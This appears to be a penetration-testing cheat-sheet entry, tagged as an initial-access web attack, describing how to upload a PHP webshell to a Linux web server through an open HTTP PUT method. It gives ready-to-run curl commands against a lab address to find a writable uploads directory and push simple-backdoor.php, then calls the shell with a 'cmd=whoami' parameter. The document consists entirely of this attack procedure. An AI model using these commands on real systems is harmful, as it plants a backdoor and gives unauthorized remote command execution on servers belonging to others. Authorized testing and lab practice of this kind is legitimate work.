---
title: HTTP PUT File Upload
category: initial-access
subcategory: web-attacks
os: linux
command: curl --upload-file shell.php target/uploads/
tools: curl
---


### Discover writable upload directory

```bash
curl -v http://10.10.12.3/uploads
```

### Upload a webshell via PUT

```bash
curl http://10.10.12.3/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php
```

### Trigger via browser

```bash
firefox http://10.10.12.3/uploads/simple-backdoor.php?cmd=whoami
```
